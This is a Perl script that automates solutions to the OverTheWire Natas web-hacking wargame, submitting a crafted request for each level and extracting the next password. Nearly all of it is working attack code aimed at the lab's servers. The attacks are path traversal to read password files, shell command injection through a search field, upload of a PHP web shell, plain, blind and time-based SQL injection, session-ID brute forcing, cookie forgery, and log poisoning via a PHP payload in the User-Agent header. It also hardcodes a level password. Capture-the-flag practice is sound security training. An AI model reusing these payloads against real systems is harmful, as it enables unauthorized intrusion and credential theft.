use warnings;
use strict;

use LWP::UserAgent;
use MIME::Base64;
use Encode qw(encode_utf8);
use HTTP::Request ();
use JSON::MaybeXS qw(encode_json);

my $ua = LWP::UserAgent->new;

sub level0 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas0:" . $pass);
    my $res = $ua->get("http://natas0.natas.labs.overthewire.org/", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level1 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas1:" . $pass);
    my $res = $ua->get("http://natas1.natas.labs.overthewire.org/", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level2 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas2:" . $pass);
    my $res = $ua->get("http://natas2.natas.labs.overthewire.org/files/users.txt", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level3 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas3:" . $pass);
    my $res = $ua->get("http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level4 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas4:" . $pass);
    my $res = $ua->get("http://natas4.natas.labs.overthewire.org/", "Authorization" => $auth, "Referer" => "http://natas5.natas.labs.overthewire.org/");
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level5 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas5:" . $pass);
    my $res = $ua->get("http://natas5.natas.labs.overthewire.org/", "Authorization" => $auth, "Cookie" => "loggedin=1");
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level6 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas6:" . $pass);
    my @form = {"secret" => "FOEIUWGHFEEUHOFUOIU", "submit" => "Submit"};
    my $res = $ua->post("http://natas6.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level7 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas7:" . $pass);
    my $res = $ua->get("http://natas7.natas.labs.overthewire.org/?page=../../../../../../../../../../etc/natas_webpass/natas8", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level8 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas8:" . $pass);
    my @form = {"secret" => "oubWYf2kBq", "submit" => "Submit"};
    my $res = $ua->post("http://natas8.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level9 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas9:" . $pass);
    my $res = $ua->get("http://natas9.natas.labs.overthewire.org/index.php?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level10 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas10:" . $pass);
    my $res = $ua->get("http://natas10.natas.labs.overthewire.org/index.php?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search", "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level11 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas11:" . $pass);
    my $res = $ua->get("http://natas11.natas.labs.overthewire.org/index.php?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search", "Authorization" => $auth, "Cookie" => "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK");
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

#TODO: upload file same as level13
sub level12 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas12:" . $pass);
    my $res = $ua->post("http://natas12.natas.labs.overthewire.org/index.php", "Authorization" => $auth, "Content-Type" => "multipart/form-data",  "Content-Length" => "466", "Content-Disposition" => "form-data; name=\"MAX_FILE_SIZE\"\n\n1000", "Content-Disposition" => "form-data; name=\"filename\"\n\nshell.php", "Content-Disposition" => "form-data; name=\"uploadedfile\"\n\n<?php\nsystem(\"cat /etc/natas_webpass/natas13\");");
    print "\nLOL\n", $res->decoded_content, "\nLOL\n";
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level14 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas14:" . $pass);
    my @form = {"username" => "", "password" => "\" or \"\"=\""};
    my $res = $ua->post("http://natas14.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
    my ($nextPass) = ($res->content =~ m/[^"]([A-Za-z0-9]{32})/);
    return $nextPass;
}

sub level15 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas15:" . $pass);
    my $nextPass = "";
    my $index = 1;
    while ($index <= 32) {
        for my $char (split //, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") {
            my @form = {"username" => 'natas16" and md5(substring(password, ' . $index . ', 1)) = md5("' . $char . '") -- '};
            my $res = $ua->post("http://natas15.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
            if ($res->content =~ m/This user exists./) {
                print $char;
                $nextPass .= $char;
                $index++;
            }
        }
    }
    return $nextPass;
}

sub level16 {
    my $pass = shift @_;
    my $nextPass = "";
    my $auth = "Basic " . encode_base64("natas16:" . $pass);
    while (length $nextPass < 32) {
        for my $char (split //, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") {
            my $payload = 'coffins$(grep ' . $nextPass . $char . ' /etc/natas_webpass/natas17)';
            my $res = $ua->post("http://natas16.natas.labs.overthewire.org/index.php?needle=" . $payload, "Authorization" => $auth);
            unless ($res->content =~ m/coffins/) {
                $nextPass .= $char;
                print $char;
            }
            $payload = 'coffins$(grep ' . $char . $nextPass . ' /etc/natas_webpass/natas17)';
            $res = $ua->post("http://natas16.natas.labs.overthewire.org/index.php?needle=" . $payload, "Authorization" => $auth);
            unless ($res->content =~ m/coffins/) {
                $nextPass = $char . $nextPass;
                print $char;
            }
        }
    }
    return $nextPass;
}

sub level17 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas17:" . $pass);
    my $nextPass = "";
    my $index = 1;
    while ($index <= 32) {
        for my $char (split //, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") {
            my @form = {"username" => 'natas18" and md5(substring(password, ' . $index . ', 1)) = md5("' . $char . '") and sleep(4) -- '};
            my $timeStart = time();
            my $res = $ua->post("http://natas17.natas.labs.overthewire.org/", \@form, "Authorization" => $auth);
            my $timeEnd = time();
            if ($timeEnd - $timeStart > 2) {
                print $char;
                $nextPass .= $char;
                $index++;
            }
        }
    }
    return $nextPass;
}

sub level18 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas18:" . $pass);
    for my $sessId (1..640) {
        my $res = $ua->post("http://natas18.natas.labs.overthewire.org/index.php", "Authorization" => $auth, "Cookie" => "PHPSESSID=" . $sessId);
        if ($res->content =~ m/[^"]([A-Za-z0-9]{32})/) {
            return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
        }
    }
}

sub level19 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas19:" . $pass);
    for my $try (1000..1999) {
        my ($d0, $d1, $d2, $d3) = split //, "" . $try;
        my @form = ("username", "natas20", "password", "f");
        my $sessId = "3" . $d1;
        my $res3 = $ua->post("http://natas19.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth, "Cookie" => "PHPSESSID=" . $sessId . "2d61646d696e");
        $sessId .= "3" . $d2;
        my $res2 = $ua->post("http://natas19.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth, "Cookie" => "PHPSESSID=" . $sessId . "2d61646d696e");
        $sessId .= "3" . $d3;
        my $res1 = $ua->post("http://natas19.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth, "Cookie" => "PHPSESSID=" . $sessId . "2d61646d696e");
        my $res = $res3->content . $res2->content . $res1->content;
        if ($res =~ m/[^"]([A-Za-z0-9]{32})/) {
            return ($res =~ m/[^"]([A-Za-z0-9]{32})/)[0];
        }
    }
}

sub level20 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas20:" . $pass);
    my @form = ("name", "myName\nadmin 1");
    my $res = $ua->post("http://natas20.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth);
    my $cookies = $res->header("Set-Cookie");
    $res = $ua->post("http://natas20.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth, "Cookie" => $cookies);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

sub level21 {
    my $pass = shift @_;
    my $auth = "Basic " . encode_base64("natas21:" . $pass);
    my @form = ("admin", "1", "submit", "Update");
    my $res = $ua->post("http://natas21-experimenter.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth);
    my $cookies = $res->header("Set-Cookie");
    $res = $ua->post("http://natas21.natas.labs.overthewire.org/index.php", \@form, "Authorization" => $auth, "Cookie" => $cookies);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

sub level22 {
    my $pass = shift @_;
    $ua->max_redirect(0);
    my $auth = "Basic " . encode_base64("natas22:" . $pass);
    my $res = $ua->get("http://natas22.natas.labs.overthewire.org/index.php?revelio", "Authorization" => $auth);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

sub level23 {
    my $pass = shift @_;
    $ua->max_redirect(0);
    my $auth = "Basic " . encode_base64("natas23:" . $pass);
    my $res = $ua->get("http://natas23.natas.labs.overthewire.org/?passwd=99iloveyou", "Authorization" => $auth);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

sub level24 {
    my $pass = shift @_;
    $ua->max_redirect(0);
    my $auth = "Basic " . encode_base64("natas24:" . $pass);
    my $res = $ua->get("http://natas24.natas.labs.overthewire.org/?passwd[]", "Authorization" => $auth);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

sub level25 {
    my $pass = shift @_;
    $ua->max_redirect(0);
    my $auth = "Basic " . encode_base64("natas25:" . $pass);
    my $res = $ua->get("http://natas25.natas.labs.overthewire.org/?lang=" . ("..././" x 20) . "/etc/passwd", "Authorization" => $auth, "User-Agent" => "<?php include(\"/etc/natas_webpass/natas26\"); ?>");
    my ($cookie) = ($res->header("Set-Cookie") =~ m/PHPSESSID=(\w+); path/);
    $res = $ua->get("http://natas25.natas.labs.overthewire.org/?lang=" . ("..././" x 20) . "/var/www/natas/natas25/logs/natas25_$cookie.log", "Authorization" => $auth);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

sub level26 {
    my $pass = shift @_;
    $ua->max_redirect(0);
    my $auth = "Basic " . encode_base64("natas25:" . $pass);
    my $res = $ua->get("http://natas25.natas.labs.overthewire.org/", "Authorization" => $auth);
    return ($res->content =~ m/[^"]([A-Za-z0-9]{32})/)[0];
}

#my @exploits = (\&level0, \&level1, \&level2, \&level3, \&level4, \&level5, \&level6, \&level7, \&level8, \&level9, \&level10, \&level11, \&level12);
#my $curLogin = 0;
#my $curPass = "natas0";
my @exploits = (\&level26);
my $curLogin = 26;
my $curPass = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T";
print "natas" . $curLogin . ":" . $curPass . "\n";
for my $exploit (@exploits) {
    my $newPass = $exploit->($curPass);
    $curLogin++;
    $curPass = $newPass;
    print "natas" . $curLogin . ":" . $curPass . "\n";
}